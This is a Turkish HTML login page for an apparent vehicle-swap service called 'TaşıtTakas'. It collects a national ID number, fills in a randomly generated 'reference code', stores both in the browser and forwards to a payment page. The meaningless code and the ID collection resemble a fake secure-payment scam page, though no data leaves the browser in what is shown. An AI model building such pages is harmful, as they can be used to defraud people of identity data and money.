
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TaşıtTakas - Güvenli Giriş</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #ffffff;
      font-family: 'Roboto', sans-serif;
      color: #1f2937;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
    }
    .container {
      width: 100%;
      max-width: 480px;
      padding: 1rem;
    }
    .card {
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
      padding: 1.5rem;
      transition: transform 0.3s ease;
    }
    .card:hover {
      transform: translateY(-4px);
    }
    .logo {
      text-align: center;
      margin-bottom: 1.5rem;
      padding-bottom: 1rem;
      border-bottom: 1px solid #e5e7eb;
    }
    .logo img {
      max-height: 50px;
      width: auto;
      object-fit: contain;
    }
    .error {
      color: #dc2626;
      font-size: 0.875rem;
      margin-top: 0.25rem;
      display: none;
    }
    .stepper {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-bottom: 1.5rem;
    }
    .step {
      width: 2.5rem;
      height: 2.5rem;
      background: #d1d5db;
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 500;
    }
    .step.active {
      background: #10b981;
    }
    button {
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    button:hover {
      transform: scale(1.03);
    }
    .ref-button {
      background: #1e3a8a;
      color: white;
      padding: 0.5rem 1rem;
      border-radius: 6px;
      margin-top: 0.5rem;
      font-weight: 500;
    }
    .loader {
      display: none;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #10b981;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @media (max-width: 480px) {
      .container {
        padding: 0.75rem;
      }
      .card {
        padding: 1rem;
      }
      .logo img {
        max-height: 40px;
      }
      input {
        font-size: 0.875rem;
      }
      button {
        font-size: 0.875rem;
        padding: 0.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://via.placeholder.com/150x50?text=TaşıtTakas" alt="TaşıtTakas Logo">
    </div>
    <div class="stepper">
      <div class="step active">1</div>
      <div class="step">2</div>
    </div>
    <div class="card">
      <h1 class="text-2xl font-bold text-center mb-4 text-gray-800">TaşıtTakas - Güvenli Giriş</h1>
      <form id="paymentForm" class="space-y-4">
        <div>
          <label for="tcNo" class="block text-sm font-medium text-gray-700">T.C. Kimlik Numarası</label>
          <input type="text" id="tcNo" name="tcNo" class="mt-1 block w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent" placeholder="T.C. Kimlik Numarası" required>
          <p id="tcError" class="error">Geçerli bir T.C. Kimlik Numarası giriniz.</p>
        </div>
        <div>
          <label for="refCode" class="block text-sm font-medium text-gray-700">Referans Kodu</label>
          <input type="text" id="refCode" name="refCode" class="mt-1 block w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent" placeholder="Referans Kodu" required>
          <button type="button" class="ref-button" onclick="generateRefCode()">Referans Kodu Al</button>
          <p id="refError" class="error">Referans Kodu en az 5 karakter olmalıdır.</p>
        </div>
        <button type="submit" id="submitBtn" class="w-full bg-green-600 text-white p-3 rounded-lg hover:bg-green-700 font-medium">Devam Et</button>
        <div id="loader" class="loader"></div>
      </form>
    </div>
  </div>
  <script>
    function validateTC(tcNo) {
      if (tcNo.length !== 11 || isNaN(tcNo)) return false;
      let digits = tcNo.split('').map(Number);
      if (digits[0] === 0) return false;
      let oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
      let evenSum = digits[1] + digits[3] + digits[5] + digits[7];
      let checkDigit10 = (oddSum * 7 - evenSum) % 10;
      let checkDigit11 = (oddSum + evenSum + digits[9]) % 10;
      return checkDigit10 === digits[9] && checkDigit11 === digits[10];
    }

    function generateRefCode() {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let refCode = '';
      for (let i = 0; i < 8; i++) {
        refCode += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      document.getElementById('refCode').value = refCode;
      document.getElementById('refError').style.display = 'none';
    }

    document.getElementById('paymentForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const tcNo = document.getElementById('tcNo').value;
      const refCode = document.getElementById('refCode').value;
      const tcError = document.getElementById('tcError');
      const refError = document.getElementById('refError');
      const submitBtn = document.getElementById('submitBtn');
      const loader = document.getElementById('loader');
      let isValid = true;

      if (!validateTC(tcNo)) {
        tcError.style.display = 'block';
        isValid = false;
      } else {
        tcError.style.display = 'none';
      }

      if (refCode.trim().length < 5) {
        refError.style.display = 'block';
        isValid = false;
      } else {
        refError.style.display = 'none';
      }

      if (isValid) {
        submitBtn.disabled = true;
        loader.style.display = 'block';
        sessionStorage.setItem('tcNo', tcNo);
        sessionStorage.setItem('refCode', refCode);
        setTimeout(() => {
          window.location.href = 'odeme.html';
        }, 1000);
      }
    });
  </script>
</body>
</html>
